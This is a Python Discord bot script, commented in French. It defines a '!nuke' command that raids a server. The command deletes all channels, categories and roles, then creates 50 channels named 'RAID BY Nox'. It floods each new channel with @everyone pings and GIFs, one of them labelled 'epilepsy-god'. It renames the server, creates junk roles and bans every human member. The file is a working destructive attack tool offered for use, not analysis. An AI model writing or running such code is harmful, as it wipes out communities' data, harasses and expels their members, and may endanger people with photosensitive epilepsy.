import discord
from discord.ext import commands
import os
import asyncio

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f"{bot.user} est connecté !")

@bot.command()
async def nuke(ctx):
    if not ctx.author.guild_permissions.administrator:
        print("Pas les permissions.")
        return

    guild = ctx.guild

    async def delete_channels_and_categories():
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"Supprimé : {channel.name}")
            except Exception as e:
                print(f"Erreur suppression {channel.name}: {str(e)}")

        for category in guild.categories:
            try:
                await category.delete()
                print(f"Catégorie supprimée : {category.name}")
            except Exception as e:
                print(f"Erreur suppression catégorie {category.name}: {str(e)}")

    async def delete_roles():
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                    print(f"Rôle supprimé : {role.name}")
                except Exception as e:
                    print(f"Erreur suppression rôle {role.name}: {str(e)}")

    async def create_channels_and_spam():
        gifs = [
            "https://cdn.discordapp.com/attachments/1363575343197327500/1363581586834198528/epilepsy-god.gif?ex=68068dd0&is=68053c50&hm=edb89319941a6ce92de22e07189fe8b1163c1d9e9d825e699bdf495ac0e3749d&",
            "https://cdn.discordapp.com/attachments/1363575343197327500/1363581587198972207/The-Purge-Season-1-Finale-Joe-Owens-Jenna-Betancourt-Rick-Betancourt.gif?ex=68068dd0&is=68053c50&hm=82c41c1016222e6de8c535b50c44da60d33b9b09bd43426ef3398c43859eec1f&",
            "https://cdn.discordapp.com/attachments/1363575343197327500/1363582067522277637/images.jpg?ex=68068e43&is=68053cc3&hm=7b6f81fc88b7072a144f78c0232a45c9083f0e3674d9ef101d396d3925b0bea3&",
            "https://cdn.discordapp.com/attachments/1363575343197327500/1363582067870535750/f4a7c1fd5f5056cbc63f948f66b187a7.gif?ex=68068e43&is=68053cc3&hm=ad6b25f2f06c3fb6746e6d1f206ee7c90d9cfe46fc1a170f1cdac701b2485684&"
        ]
        
        for _ in range(50):
            try:
                channel = await guild.create_text_channel("☠️ RAID BY Nox ☠️")
                print(f"Salon créé : {channel.name}")

                # S'assurer que le bot a la permission d'envoyer des messages dans le salon
                await channel.set_permissions(guild.me, send_messages=True)

                # Choisir un GIF au hasard dans la liste
                embed = discord.Embed(description="☠️ RAID BY Nox ☠️\n@everyone", color=discord.Color.red())
                embed.set_image(url=gifs[_ % len(gifs)])  # Sélectionner un GIF en fonction de l'index
                
                for _ in range(5):
                    try:
                        await channel.send(embed=embed)
                    except Exception as e:
                        print(f"Erreur envoi message : {str(e)}")
            except Exception as e:
                print(f"Erreur création salon : {str(e)}")

    async def rename_server():
        try:
            await guild.edit(name="☠️ RAID BY Nox ☠️")
            print("Serveur renommé.")
        except Exception as e:
            print(f"Erreur renommage serveur : {str(e)}")

    async def create_roles():
        for i in range(30):
            try:
                await guild.create_role(name="☠️ RAID BY Nox ☠️")
                print(f"Rôle {i+1} créé.")
            except Exception as e:
                print(f"Erreur création rôle {i+1}: {str(e)}")

    async def ban_members():
        for member in guild.members:
            if not member.bot:
                try:
                    await member.ban(reason="☠️ RAID BY Nox ☠️")
                    print(f"{member.name} banni.")
                except Exception as e:
                    print(f"Erreur ban {member.name}: {str(e)}")

    try:
        await delete_channels_and_categories()
        await delete_roles()
        await create_channels_and_spam()
        await rename_server()
        await create_roles()
        await ban_members()
        print("Nuke terminé.")
    except Exception as e:
        print(f"Erreur générale : {str(e)}")

bot.run(os.getenv("TOKEN"))
